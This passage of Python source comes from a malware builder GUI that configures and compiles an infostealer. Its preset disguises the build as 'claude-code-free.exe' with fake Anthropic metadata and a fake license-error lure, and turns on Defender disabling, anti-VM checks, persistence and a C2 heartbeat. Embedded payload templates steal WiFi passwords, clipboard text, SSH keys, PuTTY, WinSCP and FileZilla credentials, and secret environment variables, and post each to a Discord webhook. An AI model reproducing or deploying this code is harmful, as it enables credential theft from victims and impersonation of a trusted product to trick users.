                ("clipboard", sv_clipboard), ("ssh_keys", sv_ssh_keys), ("filezilla", sv_filezilla),
                ("env_variables", sv_env_variables), ("minecraft", sv_minecraft),
                ("keylogger", sv_keylogger), ("crypto_wallets", sv_crypto_wallets),
                ("microphone", sv_microphone), ("block_key", sv_block_key),
                ("block_mouse", sv_block_mouse), ("block_task_manager", sv_block_task_manager),
                ("block_website", sv_block_website), ("shutdown", sv_shutdown),
                ("spam_open_programs", sv_spam_open_programs), ("spam_create_files", sv_spam_create_files),
                ("fake_error", sv_fake_error), ("startup", sv_startup), ("restart", sv_restart),
                ("anti_vm_and_debug", sv_anti_vm_and_debug), ("clipboard_hijacker", sv_clipboard_hijacker),
                ("melt", sv_melt), ("disable_defender", sv_disable_defender),
                ("usb_spreader", sv_usb_spreader), ("scheduled_task", sv_scheduled_task),
                ("c2_heartbeat", sv_c2_heartbeat),
                ("process_disguise", sv_process_disguise), ("polymorphic_repack", sv_polymorphic_repack),
                ("lan_spreader", sv_lan_spreader),
                ("timing_evasion", sv_timing_evasion), ("string_encryption", sv_string_encryption),
                ("upx_compress", sv_upx_compress), ("fake_metadata", sv_fake_metadata),
                ("firefox", sv_firefox), ("steam", sv_steam),
            ]:
                data[name] = sv.get()
            with open(fp, 'w') as f: json.dump(data, f, indent=2)
            InfoLogs(f"Profile saved: {os.path.basename(fp)}")
        except Exception as e: ErrorLogs(str(e))

    def LoadProfile():
        try:
            fp = filedialog.askopenfilename(parent=builder, filetypes=[("JSON","*.json")], title="Load profile")
            if not fp: return
            with open(fp) as f: data = json.load(f)
            for k, sv in [("webhook", webhook_url), ("name_file", name_file_entry),
                          ("fake_name", fake_name_entry), ("fake_company", fake_company_entry),
                          ("fake_version", fake_ver_entry), ("upx_path", upx_path_entry)]:
                if k in data: sv.delete(0, "end"); sv.insert(0, data[k])
            for name, sv in [
                ("file_type", sv_file_type), ("system", sv_system), ("wallets", sv_wallets),
                ("game_launchers", sv_game_launchers), ("apps", sv_apps), ("roblox", sv_roblox),
                ("discord", sv_discord), ("discord_injection", sv_discord_injection),
                ("passwords", sv_passwords), ("cookies", sv_cookies), ("history", sv_history),
                ("downloads", sv_downloads), ("cards", sv_cards), ("extentions", sv_extentions),
                ("interesting_files", sv_interesting_files), ("webcam", sv_webcam),
                ("screenshot", sv_screenshot), ("wifi_passwords", sv_wifi_passwords),
                ("clipboard", sv_clipboard), ("ssh_keys", sv_ssh_keys), ("filezilla", sv_filezilla),
                ("env_variables", sv_env_variables), ("minecraft", sv_minecraft),
                ("keylogger", sv_keylogger), ("crypto_wallets", sv_crypto_wallets),
                ("microphone", sv_microphone), ("block_key", sv_block_key),
                ("block_mouse", sv_block_mouse), ("block_task_manager", sv_block_task_manager),
                ("block_website", sv_block_website), ("shutdown", sv_shutdown),
                ("spam_open_programs", sv_spam_open_programs), ("spam_create_files", sv_spam_create_files),
                ("fake_error", sv_fake_error), ("startup", sv_startup), ("restart", sv_restart),
                ("anti_vm_and_debug", sv_anti_vm_and_debug), ("clipboard_hijacker", sv_clipboard_hijacker),
                ("melt", sv_melt), ("disable_defender", sv_disable_defender),
                ("usb_spreader", sv_usb_spreader), ("scheduled_task", sv_scheduled_task),
                ("c2_heartbeat", sv_c2_heartbeat),
                ("process_disguise", sv_process_disguise), ("polymorphic_repack", sv_polymorphic_repack),
                ("lan_spreader", sv_lan_spreader),
                ("timing_evasion", sv_timing_evasion), ("string_encryption", sv_string_encryption),
                ("upx_compress", sv_upx_compress), ("fake_metadata", sv_fake_metadata),
                ("firefox", sv_firefox), ("steam", sv_steam),
            ]:
                if name in data: sv.set(data[name])
            _update_stats()
            InfoLogs(f"Profile loaded: {os.path.basename(fp)}")
        except Exception as e: ErrorLogs(str(e))

    ctk.CTkButton(prof_frame, text="Save Profile", command=SaveProfile, width=130, height=36,
                  fg_color=colors["dark_gray"], hover_color="#333333",
                  font=ctk.CTkFont(size=12)).pack(side="left", padx=(0, 6))
    ctk.CTkButton(prof_frame, text="Load Profile", command=LoadProfile, width=130, height=36,
                  fg_color=colors["dark_gray"], hover_color="#333333",
                  font=ctk.CTkFont(size=12)).pack(side="left")

    ctk.CTkLabel(cfg, text="Fake Error  —  title & message shown to victim (Fake Error module must be ON)",
                 **LBL).grid(row=20, column=0, columnspan=2, padx=20, pady=(18, 2), sticky="w")
    fake_err_title_entry = ctk.CTkEntry(cfg, placeholder_text="Error window title  (e.g. Windows Update)",
                                         width=300, **ENT)
    fake_err_msg_entry   = ctk.CTkEntry(cfg, placeholder_text="Error message  (e.g. Update failed. Please restart.)",
                                         width=560, **ENT)
    fake_err_title_entry.grid(row=21, column=0, padx=20, pady=(0, 4), sticky="w")
    fake_err_msg_entry.grid(  row=22, column=0, columnspan=2, padx=20, pady=(0, 20), sticky="w")

    def _on_file_type(*_):
        is_exe = sv_file_type.get() == "Exe File"
        icon_btn.configure(state="normal" if is_exe else "disabled")
        binder_btn.configure(state="normal" if is_exe else "disabled")
    sv_file_type.trace_add("write", _on_file_type)
    icon_btn.configure(state="disabled")

    def BuildSettings():
        global option_system, option_game_launchers, option_wallets, option_apps
        global option_discord, option_discord_injection, option_passwords, option_cookies
        global option_history, option_downloads, option_cards, option_extentions
        global option_interesting_files, option_roblox, option_webcam, option_screenshot
        global option_wifi_passwords, option_clipboard, option_ssh_keys, option_filezilla
        global option_env_variables, option_minecraft, option_keylogger
        global option_block_key, option_block_mouse, option_block_task_manager, option_block_website
        global option_shutdown, option_spam_open_programs, option_spam_create_files
        global option_fake_error, option_startup, option_restart, option_anti_vm_and_debug
        global option_clipboard_hijacker, option_melt, option_disable_defender
        global option_usb_spreader, option_scheduled_task, option_c2_heartbeat
        global option_process_disguise, option_polymorphic_repack, option_lan_spreader
        global option_timing_evasion, option_string_encryption, option_upx_compress, option_fake_metadata
        global option_crypto_wallets, option_microphone
        global option_firefox, option_steam
        global webhook, name_file, file_type, icon_path
        global _build_upx_path, _build_fake_name, _build_fake_company, _build_fake_ver
        global binder_path, c2_registry_msgid
        global fake_error_title, fake_error_message

        option_system               = sv_system.get()
        option_game_launchers       = sv_game_launchers.get()
        option_wallets              = sv_wallets.get()
        option_apps                 = sv_apps.get()
        option_discord              = sv_discord.get()
        option_discord_injection    = sv_discord_injection.get()
        option_passwords            = sv_passwords.get()
        option_cookies              = sv_cookies.get()
        option_history              = sv_history.get()
        option_downloads            = sv_downloads.get()
        option_cards                = sv_cards.get()
        option_extentions           = sv_extentions.get()
        option_interesting_files    = sv_interesting_files.get()
        option_roblox               = sv_roblox.get()
        option_webcam               = sv_webcam.get()
        option_screenshot           = sv_screenshot.get()
        option_wifi_passwords       = sv_wifi_passwords.get()
        option_clipboard            = sv_clipboard.get()
        option_ssh_keys             = sv_ssh_keys.get()
        option_filezilla            = sv_filezilla.get()
        option_env_variables        = sv_env_variables.get()
        option_minecraft            = sv_minecraft.get()
        option_keylogger            = sv_keylogger.get()
        option_block_key            = sv_block_key.get()
        option_block_mouse          = sv_block_mouse.get()
        option_block_task_manager   = sv_block_task_manager.get()
        option_block_website        = sv_block_website.get()
        option_shutdown             = sv_shutdown.get()
        option_spam_open_programs   = sv_spam_open_programs.get()
        option_spam_create_files    = sv_spam_create_files.get()
        option_fake_error           = sv_fake_error.get()
        option_startup              = sv_startup.get()
        option_restart              = sv_restart.get()
        option_anti_vm_and_debug    = sv_anti_vm_and_debug.get()
        option_clipboard_hijacker   = sv_clipboard_hijacker.get()
        option_melt                 = sv_melt.get()
        option_disable_defender     = sv_disable_defender.get()
        option_usb_spreader         = sv_usb_spreader.get()
        option_scheduled_task       = sv_scheduled_task.get()
        option_c2_heartbeat         = sv_c2_heartbeat.get()
        option_process_disguise     = sv_process_disguise.get()
        option_polymorphic_repack   = sv_polymorphic_repack.get()
        option_lan_spreader         = sv_lan_spreader.get()
        option_timing_evasion       = sv_timing_evasion.get()
        option_string_encryption    = sv_string_encryption.get()
        option_upx_compress         = sv_upx_compress.get()
        option_fake_metadata        = sv_fake_metadata.get()
        option_crypto_wallets       = sv_crypto_wallets.get()
        option_microphone           = sv_microphone.get()
        option_firefox              = sv_firefox.get()
        option_steam                = sv_steam.get()
        webhook                     = webhook_url.get()
        name_file                   = name_file_entry.get()
        file_type                   = sv_file_type.get()
        c2_registry_msgid           = registry_msgid_entry.get().strip()

        if not webhook.strip():
            _show_section("CONFIG"); ErrorLogs("Please enter the webhook."); return
        if not name_file.strip():
            _show_section("CONFIG"); ErrorLogs("Please enter the file name."); return
        if file_type == "File Type":
            _show_section("CONFIG"); ErrorLogs("Please choose the file type."); return

        _build_upx_path     = upx_path_entry.get().strip()
        _build_fake_name    = fake_name_entry.get().strip()
        _build_fake_company = fake_company_entry.get().strip()
        _build_fake_ver     = fake_ver_entry.get().strip()

        if option_fake_error == "Enable":
            _fe_t = fake_err_title_entry.get().strip()
            _fe_m = fake_err_msg_entry.get().strip()
            if _fe_t: fake_error_title   = _fe_t
            if _fe_m: fake_error_message = _fe_m

        ClosingBuild()

    # Build button placed in sidebar placeholder
    ctk.CTkButton(_build_btn_ph, text="▶  BUILD", command=BuildSettings,
                  height=46, corner_radius=6,
                  fg_color=colors["red"], hover_color=colors["dark_red"],
                  font=ctk.CTkFont(family="Helvetica", size=14, weight="bold")
                  ).pack(fill="x", expand=True)

    _show_section("STEALER")
    _update_stats()

    builder.protocol("WM_DELETE_WINDOW", ClosingWindow)

    if _PRESET_MODE:
        _cli_wh = ""
        _preset_argv_idx = sys.argv.index("--preset") + 1
        if _preset_argv_idx < len(sys.argv):
            _cli_wh = sys.argv[_preset_argv_idx]
        if not _cli_wh or not _cli_wh.startswith("https://discord.com/api/webhooks/"):
            print(f"\n  {red}── Preset Build · claude-code-free ──{white}\n")
            _cli_wh = input(f"  {INPUT} Discord Webhook URL: ").strip()
        if not _cli_wh.startswith("https://discord.com/api/webhooks/"):
            print(f"  {ERROR} Invalid webhook URL."); Continue(); sys.exit(0)
        webhook   = _cli_wh
        name_file = "claude-code-free"
        file_type = "Exe File"
        icon_path = "None"
        binder_path       = ""
        c2_registry_msgid = ""
        # STEALER — all except keylogger + discord_injection
        option_system = option_game_launchers = option_wallets = option_apps = "Enable"
        option_discord = "Enable";  option_discord_injection = "Disable"
        option_passwords = option_cookies = option_history = option_downloads = "Enable"
        option_cards = option_extentions = option_interesting_files = "Enable"
        option_roblox = option_webcam = option_screenshot = "Enable"
        option_wifi_passwords = option_clipboard = option_ssh_keys = option_filezilla = "Enable"
        option_env_variables = option_minecraft = "Enable"
        option_keylogger = "Disable"
        option_crypto_wallets = option_microphone = option_firefox = option_steam = "Enable"
        # MALWARE — stealthy/credible only, nothing visible/blocking/disruptive
        option_block_key = option_block_mouse = option_block_task_manager = option_block_website = "Disable"
        option_shutdown = option_spam_open_programs = option_spam_create_files = "Disable"
        option_restart = option_usb_spreader = option_lan_spreader = option_clipboard_hijacker = "Disable"
        option_anti_vm_and_debug = "Enable"
        option_startup           = "Enable"
        option_fake_error        = "Enable"
        fake_error_title   = "claude-code-free"
        fake_error_message = ("License verification failed.\n"
                              "Your subscription could not be activated.\n"
                              "Please reinstall the application or visit claude.ai/code to manage your license.")
        option_melt              = "Enable"
        option_disable_defender  = "Enable"
        option_scheduled_task    = "Enable"
        option_c2_heartbeat      = "Enable"
        option_process_disguise  = "Enable"
        option_polymorphic_repack = "Enable"
        option_timing_evasion    = "Enable"
        option_string_encryption = "Enable"
        option_upx_compress      = "Disable"
        option_fake_metadata     = "Enable"
        _build_fake_name    = "Claude Code"
        _build_fake_company = "Anthropic Inc."
        _build_fake_ver     = "0.2.38"
        _build_upx_path     = ""
        print(f"  {ADD} Preset config loaded — building {red}claude-code-free.exe{white} ...")
    else:
        builder.mainloop()

    if not exit_window:
        try: builder.destroy()
        except: pass

    time.sleep(0.2)

    if file_type in ("File Type", "None") or not name_file.strip() or name_file == "None" \
       or not webhook.strip() or webhook == "None":
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Window closed — build cancelled.")
        Continue(); sys.exit(0)

    def _fmt(v): return f"{BEFORE_GREEN}+{AFTER_GREEN}" if v == "Enable" else f"{BEFORE}x{AFTER}"

    print(f"""
    {red}── Stealer ───────────────────────────────────────────────────────────────{white}
    {_fmt(option_system)            } System Info            {_fmt(option_discord_injection)  } Discord Injection    {_fmt(option_extentions)         } Extensions
    {_fmt(option_wallets)           } Wallets Session        {_fmt(option_passwords)          } Passwords            {_fmt(option_interesting_files)  } Interesting Files
    {_fmt(option_game_launchers)    } Game Launchers         {_fmt(option_cookies)            } Cookies              {_fmt(option_webcam)             } Webcam
    {_fmt(option_apps)              } Telegram Session       {_fmt(option_history)            } Browsing History     {_fmt(option_screenshot)         } Screenshot
    {_fmt(option_roblox)            } Roblox Accounts        {_fmt(option_downloads)          } Download History     {_fmt(option_ssh_keys)           } SSH Keys
    {_fmt(option_discord)           } Discord Accounts       {_fmt(option_cards)              } Cards                {_fmt(option_filezilla)          } FileZilla Creds
    {_fmt(option_wifi_passwords)    } WiFi Passwords         {_fmt(option_clipboard)          } Clipboard            {_fmt(option_env_variables)      } Env Variables
    {_fmt(option_minecraft)         } Minecraft Session      {_fmt(option_keylogger)          } Keylogger
    {_fmt(option_firefox)           } Firefox Data           {_fmt(option_steam)              } Steam Session

    {red}── Malware ───────────────────────────────────────────────────────────────{white}
    {_fmt(option_block_key)         } Block Keyboard         {_fmt(option_shutdown)           } Shutdown             {_fmt(option_anti_vm_and_debug)  } Anti VM & Debug
    {_fmt(option_block_mouse)       } Block Mouse            {_fmt(option_fake_error)         } Fake Error           {_fmt(option_startup)            } Launch at Startup
    {_fmt(option_block_task_manager)} Block Task Manager     {_fmt(option_spam_open_programs) } Spam Open Programs   {_fmt(option_restart)            } Restart Every 5min
    {_fmt(option_block_website)     } Block AV Websites      {_fmt(option_spam_create_files)  } Spam Create Files    {_fmt(option_scheduled_task)     } Scheduled Task
    {_fmt(option_clipboard_hijacker)} Clipboard Hijacker     {_fmt(option_melt)               } Melt (Self-Delete)   {_fmt(option_disable_defender)   } Disable Defender
    {_fmt(option_usb_spreader)      } USB Spreader           {_fmt(option_c2_heartbeat)       } C2 Heartbeat (10s)
    {_fmt(option_process_disguise)  } Process Disguise       {_fmt(option_polymorphic_repack)  } Polymorphic Repack   {_fmt(option_lan_spreader)       } LAN Spreader
""")

    if option_fake_error == "Enable":
        print(f"{red}Fake Error Title  : {white}{fake_error_title}")
        print(f"{red}Fake Error Message: {white}{fake_error_message}")

    wh_disp = webhook[:90] + ".." if len(webhook) > 90 else webhook
    print(f"{red}Webhook  : {white}{wh_disp}\n{red}Type     : {white}{file_type}\n{red}Name     : {white}{name_file}")

    if icon_path and icon_path != "None" and os.path.exists(icon_path):
        print(f"{red}Icon     : {white}{icon_path[:100]}")
    if binder_path and os.path.isfile(binder_path):
        print(f"{red}Binder   : {white}{os.path.basename(binder_path)}")
    elif file_type == "Exe File":
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} No icon selected — building without icon.")

    from FileDetectedByAntivirus.VirusBuilderOptions import *


    _TK = "chr(96)*3"

    T_WiFi = (
        "\ntry:\n"
        "    if globals().get('_v4r_skip_steal',False): raise SystemExit\n"
        "    import subprocess as v4r_wifisub, re as v4r_wifireg, requests as v4r_wifireq\n"
        "    def D3f_GetWifi():\n"
        "        v4r_NW = v4r_wifisub.CREATE_NO_WINDOW\n"
        "        v4r_wifi_list = []\n"
        "        try:\n"
        "            v4r_wout = v4r_wifisub.check_output(\n"
        "                ['netsh','wlan','show','profiles'],\n"
        "                stderr=v4r_wifisub.DEVNULL, creationflags=v4r_NW\n"
        "            ).decode('utf-8','ignore')\n"
        "        except:\n"
        "            try: v4r_wout = v4r_wifisub.check_output(\n"
        "                ['netsh','wlan','show','profiles'],\n"
        "                stderr=v4r_wifisub.DEVNULL, creationflags=v4r_NW\n"
        "            ).decode('cp1252','ignore')\n"
        "            except: return\n"
        "        v4r_names = v4r_wifireg.findall(r':\\s+(.+)$', v4r_wout, v4r_wifireg.MULTILINE)\n"
        "        for v4r_wname in v4r_names:\n"
        "            v4r_wname = v4r_wname.strip()\n"
        "            if not v4r_wname: continue\n"
        "            try:\n"
        "                v4r_raw = v4r_wifisub.check_output(\n"
        "                    ['netsh','wlan','show','profile',v4r_wname,'key=clear'],\n"
        "                    stderr=v4r_wifisub.DEVNULL, creationflags=v4r_NW\n"
        "                )\n"
        "                try: v4r_wdet = v4r_raw.decode('utf-8','ignore')\n"
        "                except: v4r_wdet = v4r_raw.decode('cp1252','ignore')\n"
        # extract all fields with language-agnostic regex (value after last colon on each line)
        "                def v4r_field(pat):\n"
        "                    m = v4r_wifireg.search(pat, v4r_wdet, v4r_wifireg.IGNORECASE)\n"
        "                    return m.group(1).strip() if m else '?'\n"
        "                v4r_wkey  = v4r_field(r'(?:Key Content|Contenu de la cl[e\\xe9])\\s*:\\s*(.*)')\n"
        "                v4r_auth  = v4r_field(r'(?:Authentication|Authentification)\\s*:\\s*(.*)')\n"
        "                v4r_ciph  = v4r_field(r'(?:Cipher|Chiffrement)\\s*:\\s*(.*)')\n"
        "                v4r_conn  = v4r_field(r'(?:Connection mode|Mode de connexion)\\s*:\\s*(.*)')\n"
        "                v4r_wifi_list.append(\n"
        "                    f'SSID: {v4r_wname} | Pass: {v4r_wkey} | Auth: {v4r_auth} | Cipher: {v4r_ciph} | Mode: {v4r_conn}'\n"
        "                )\n"
        "            except: pass\n"
        "        if v4r_wifi_list:\n"
        "            v4r_tck = chr(96)*3\n"
        "            v4r_wifireq.post('__WEBHOOK__', json={'embeds':[{'title':f'WiFi ({len(v4r_wifi_list)} networks)','description':v4r_tck+'\\n'.join(v4r_wifi_list)[:4000]+v4r_tck,'color':11206149}],'username':'Ultria'}, timeout=8)\n"
        "    D3f_GetWifi()\n"
        "except SystemExit: pass\n"
        "except Exception as v4r_em:\n"
        "    try: _v4r_t_errors.append('WiFi: '+str(v4r_em)[:200])\n"
        "    except: pass\n"
    )

    T_SingleInstance = (
        "\ntry:\n"
        "    import ctypes as _v4r_sict\n"
        "    _v4r_si_mx = _v4r_sict.windll.kernel32.CreateMutexW(None, False,\n"
        "        'Microsoft.Windows.' + 'Update.Service.v2')\n"
        "    if _v4r_sict.windll.kernel32.GetLastError() == 183:\n"
        "        import sys as _v4r_six; _v4r_six.exit(0)\n"
        "except: pass\n"
    )

    T_FirstRunGuard = (
        "\nimport hashlib as _v4r_hl\n"
        "_v4r_c2_names = ['runtimebroker.exe','wmiprvse.exe','searchhost.exe','ctfmon.exe',\n"
        "    'dllhost.exe','sihost.exe','fontdrvhost.exe','smartscreen.exe','securityhealthhost.exe']\n"
        "_v4r_startup_name = 'ㅤ'\n"
        "_v4r_running_stem = os.path.splitext(os.path.basename(\n"
        "    sys.executable if getattr(sys,'frozen',False) else sys.argv[0]))[0]\n"
        "_v4r_skip_steal = (_v4r_running_stem == _v4r_startup_name or\n"
        "    (getattr(sys,'frozen',False) and\n"
        "     os.path.basename(sys.executable).lower() in _v4r_c2_names))\n"
        "_v4r_lock = ''\n"
        "if not _v4r_skip_steal:\n"
        "    try:\n"
        "        _v4r_hk = _v4r_hl.md5((os.environ.get('COMPUTERNAME','x')+os.environ.get('USERNAME','x')).encode()).hexdigest()[:12]\n"
        "        _v4r_lock = os.path.join(os.environ.get('APPDATA',''), 'Microsoft', 'Windows', f'wdf_{_v4r_hk}.tmp')\n"
        "        if os.path.isfile(_v4r_lock):\n"
        "            import time as _v4r_lt2\n"
        "            if _v4r_lt2.time() - os.path.getmtime(_v4r_lock) < 604800:\n"
        "                _v4r_skip_steal = True\n"
        "        if not _v4r_skip_steal:\n"
        "            os.makedirs(os.path.dirname(_v4r_lock), exist_ok=True)\n"
        "            open(_v4r_lock, 'w').close()\n"
        "    except: pass\n"
        "\n_v4r_t_errors = []\n"
    )

    T_Clipboard = (
        "\ntry:\n"
        "    if globals().get('_v4r_skip_steal',False): raise SystemExit\n"
        "    import ctypes as v4r_clipct, requests as v4r_cliprq\n"
        "    def D3f_GetClipboard():\n"
        "        v4r_content = ''\n"
        "        try:\n"
        "            if not v4r_clipct.windll.user32.OpenClipboard(None): return\n"
        "            try:\n"
        "                v4r_h = v4r_clipct.windll.user32.GetClipboardData(13)\n"
        "                if v4r_h:\n"
        "                    v4r_pt = v4r_clipct.windll.kernel32.GlobalLock(v4r_h)\n"
        "                    if v4r_pt:\n"
        "                        try: v4r_content = v4r_clipct.wstring_at(v4r_pt)\n"
        "                        except: pass\n"
        "                        v4r_clipct.windll.kernel32.GlobalUnlock(v4r_h)\n"
        "            finally:\n"
        "                v4r_clipct.windll.user32.CloseClipboard()\n"
        "        except: pass\n"
        "        if v4r_content.strip():\n"
        "            try:\n"
        "                v4r_tck = chr(96)*3\n"
        "                v4r_cliprq.post('__WEBHOOK__', json={'embeds':[{'title':'Clipboard Content','description':v4r_tck+v4r_content[:3900]+v4r_tck,'color':11206149}],'username':'Ultria'}, timeout=5)\n"
        "            except: pass\n"
        "    D3f_GetClipboard()\n"
        "except SystemExit: pass\n"
        "except Exception as v4r_em:\n"
        "    try: _v4r_t_errors.append('Clipboard: '+str(v4r_em)[:200])\n"
        "    except: pass\n"
    )

    T_SSH = (
        "\ntry:\n"
        "    if globals().get('_v4r_skip_steal',False): raise SystemExit\n"
        "    import os as v4r_sshios, requests as v4r_sshrq, io as v4r_sshio, zipfile as v4r_sshzip\n"
        "    def D3f_GetSSH():\n"
        "        v4r_buf = v4r_sshio.BytesIO()\n"
        "        v4r_found = False\n"
        "        with v4r_sshzip.ZipFile(v4r_buf, 'w', v4r_sshzip.ZIP_DEFLATED) as v4r_zf:\n"
        "            v4r_ssh_dir = v4r_sshios.path.join(v4r_sshios.path.expanduser('~'), '.ssh')\n"
        "            if v4r_sshios.path.isdir(v4r_ssh_dir):\n"
        "                for v4r_fn in v4r_sshios.listdir(v4r_ssh_dir):\n"
        "                    try:\n"
        "                        with open(v4r_sshios.path.join(v4r_ssh_dir, v4r_fn),'rb') as v4r_f:\n"
        "                            v4r_zf.writestr('dot_ssh/'+v4r_fn, v4r_f.read())\n"
        "                            v4r_found = True\n"
        "                    except: pass\n"
        "            try:\n"
        "                import winreg as v4r_wr\n"
        "                def v4r_rv(v4r_rk, v4r_nm, v4r_df=''):\n"
        "                    try: return str(v4r_wr.QueryValueEx(v4r_rk, v4r_nm)[0])\n"
        "                    except: return v4r_df\n"
        "                v4r_sk = v4r_wr.OpenKey(v4r_wr.HKEY_CURRENT_USER, r'Software\\SimonTatham\\PuTTY\\Sessions')\n"
        "                v4r_sess = []\n"
        "                v4r_i = 0\n"
        "                while True:\n"
        "                    try:\n"
        "                        v4r_sn = v4r_wr.EnumKey(v4r_sk, v4r_i); v4r_i += 1\n"
        "                        v4r_ek = v4r_wr.OpenKey(v4r_sk, v4r_sn)\n"
        "                        v4r_sess.append(\n"
        "                            f'[{v4r_sn}] user={v4r_rv(v4r_ek,\"UserName\")} host={v4r_rv(v4r_ek,\"HostName\")}'\n"
        "                            f' port={v4r_rv(v4r_ek,\"PortNumber\",\"22\")} keyfile={v4r_rv(v4r_ek,\"PublicKeyFile\")}'\n"
        "                        )\n"
        "                        v4r_wr.CloseKey(v4r_ek)\n"
        "                    except OSError: break\n"
        "                v4r_wr.CloseKey(v4r_sk)\n"
        "                if v4r_sess:\n"
        "                    v4r_zf.writestr('putty_sessions.txt', '\\n'.join(v4r_sess))\n"
        "                    v4r_found = True\n"
        "            except: pass\n"
        "            try:\n"
        "                v4r_hk = v4r_wr.OpenKey(v4r_wr.HKEY_CURRENT_USER, r'Software\\SimonTatham\\PuTTY\\SshHostKeys')\n"
        "                v4r_hkeys, v4r_i = [], 0\n"
        "                while True:\n"
        "                    try:\n"
        "                        v4r_nm, v4r_val, _ = v4r_wr.EnumValue(v4r_hk, v4r_i); v4r_i += 1\n"
        "                        v4r_hkeys.append(f'{v4r_nm}')\n"
        "                    except OSError: break\n"
        "                v4r_wr.CloseKey(v4r_hk)\n"
        "                if v4r_hkeys:\n"
        "                    v4r_zf.writestr('putty_known_hosts.txt', '\\n'.join(v4r_hkeys))\n"
        "                    v4r_found = True\n"
        "            except: pass\n"
        "            try:\n"
        "                v4r_wk = v4r_wr.OpenKey(v4r_wr.HKEY_CURRENT_USER, r'Software\\Martin Prikryl\\WinSCP 2\\Sessions')\n"
        "                v4r_wsess = []\n"
        "                v4r_i = 0\n"
        "                while True:\n"
        "                    try:\n"
        "                        v4r_sn = v4r_wr.EnumKey(v4r_wk, v4r_i); v4r_i += 1\n"
        "                        v4r_ek = v4r_wr.OpenKey(v4r_wk, v4r_sn)\n"
        "                        v4r_wsess.append(\n"
        "                            f'[{v4r_sn}] user={v4r_rv(v4r_ek,\"UserName\")} host={v4r_rv(v4r_ek,\"HostName\")}'\n"
        "                            f' port={v4r_rv(v4r_ek,\"PortNumber\",\"22\")} pass={v4r_rv(v4r_ek,\"Password\")}'\n"
        "                        )\n"
        "                        v4r_wr.CloseKey(v4r_ek)\n"
        "                    except OSError: break\n"
        "                v4r_wr.CloseKey(v4r_wk)\n"
        "                if v4r_wsess:\n"
        "                    v4r_zf.writestr('winscp_sessions.txt', '\\n'.join(v4r_wsess))\n"
        "                    v4r_found = True\n"
        "            except: pass\n"
        "        if v4r_found:\n"
        "            v4r_buf.seek(0)\n"
        "            try: v4r_sshrq.post('__WEBHOOK__', files={'file':('ssh_keys.zip', v4r_buf, 'application/zip')}, data={'username':'Ultria'}, timeout=20)\n"
        "            except: pass\n"
        "    D3f_GetSSH()\n"
        "except SystemExit: pass\n"
        "except Exception as v4r_em:\n"
        "    try: _v4r_t_errors.append('SSH: '+str(v4r_em)[:200])\n"
        "    except: pass\n"
    )

    T_FileZilla = (
        "\ntry:\n"
        "    if globals().get('_v4r_skip_steal',False): raise SystemExit\n"
        "    import os as v4r_fzios, requests as v4r_fzrq, base64 as v4r_fzb64\n"
        "    try: from xml.etree import ElementTree as v4r_fzxml\n"
        "    except: v4r_fzxml = None\n"
        "    def D3f_GetFileZilla():\n"
        "        if not v4r_fzxml: return\n"
        "        v4r_appdata = v4r_fzios.environ.get('APPDATA','')\n"
        "        v4r_fz_paths = [\n"
        "            v4r_fzios.path.join(v4r_appdata, 'FileZilla', 'recentservers.xml'),\n"
        "            v4r_fzios.path.join(v4r_appdata, 'FileZilla', 'sitemanager.xml'),\n"
        # Also check the legacy path
        "            v4r_fzios.path.join(v4r_fzios.environ.get('LOCALAPPDATA',''), 'FileZilla', 'recentservers.xml'),\n"
        "        ]\n"
        "        v4r_found = []\n"
        "        v4r_seen  = set()\n"
        "        for v4r_fp in v4r_fz_paths:\n"
        "            if not v4r_fzios.path.isfile(v4r_fp) or v4r_fp in v4r_seen: continue\n"
        "            v4r_seen.add(v4r_fp)\n"
        "            try:\n"
        "                v4r_tree = v4r_fzxml.parse(v4r_fp)\n"
        "                for v4r_s in v4r_tree.iter('Server'):\n"
        "                    v4r_host  = getattr(v4r_s.find('Host'),  'text', '?') or '?'\n"
        "                    v4r_port  = getattr(v4r_s.find('Port'),  'text', '21') or '21'\n"
        "                    v4r_user  = getattr(v4r_s.find('User'),  'text', '?') or '?'\n"
        "                    v4r_pelem = v4r_s.find('Pass')\n"
        "                    v4r_raw   = (getattr(v4r_pelem, 'text', '') or '') if v4r_pelem is not None else ''\n"
        "                    v4r_enc   = (v4r_pelem.get('encoding','') if v4r_pelem is not None else '')\n"
        # Decode base64 password (FileZilla ≤3.62 stores passwords as plain base64)
        "                    try:\n"
        "                        v4r_pass = v4r_fzb64.b64decode(v4r_raw+('='*(-len(v4r_raw)%4))).decode('utf-8','ignore') if v4r_enc=='base64' else v4r_raw\n"
        "                    except: v4r_pass = v4r_raw\n"
        "                    v4r_proto_map = {'0':'FTP','1':'SFTP','3':'FTPS','4':'FTPES','6':'StorJ'}\n"
        "                    v4r_proto = v4r_proto_map.get(getattr(v4r_s.find('Protocol'),'text','0'),'FTP')\n"
        "                    v4r_ltype = {'0':'Normal','1':'Ask','2':'Interactive','4':'Key'}.get(\n"
        "                        getattr(v4r_s.find('Logontype'),'text','0'), '?')\n"
        "                    v4r_name  = getattr(v4r_s.find('Name'), 'text', '') or ''\n"
        "                    v4r_found.append(\n"
        "                        f'[{v4r_proto}] {v4r_host}:{v4r_port} | user={v4r_user} | pass={v4r_pass} | login={v4r_ltype}'\n"
        "                        + (f' | name={v4r_name}' if v4r_name else '')\n"
        "                    )\n"
        "            except: pass\n"
        "        if v4r_found:\n"
        "            v4r_tck = chr(96)*3\n"
        "            v4r_fzrq.post('__WEBHOOK__', json={'embeds':[{'title':f'FileZilla ({len(v4r_found)} servers)','description':v4r_tck+'\\n'.join(v4r_found)[:4000]+v4r_tck,'color':11206149}],'username':'Ultria'}, timeout=8)\n"
        "    D3f_GetFileZilla()\n"
        "except SystemExit: pass\n"
        "except Exception as v4r_em:\n"
        "    try: _v4r_t_errors.append('FileZilla: '+str(v4r_em)[:200])\n"
        "    except: pass\n"
    )

    T_EnvVars = (
        "\ntry:\n"
        "    if globals().get('_v4r_skip_steal',False): raise SystemExit\n"
        "    import os as v4r_envios, requests as v4r_envrq, json as v4r_envjson, base64 as v4r_envb64\n"
        "    def D3f_GetEnv():\n"
        "        v4r_home    = v4r_envios.path.expanduser('~')\n"
        "        v4r_appdata = v4r_envios.environ.get('APPDATA','')\n"
        "        v4r_sections = {}\n"
        "        v4r_kw = ('token','secret','key','password','pass','api','auth','aws','discord','github','stripe','twilio','openai','anthropic','slack','jwt','bearer','private')\n"
        "        v4r_envlines = [f'{v4r_k}={v4r_v}' for v4r_k,v4r_v in v4r_envios.environ.items() if any(kw in v4r_k.lower() for kw in v4r_kw)]\n"
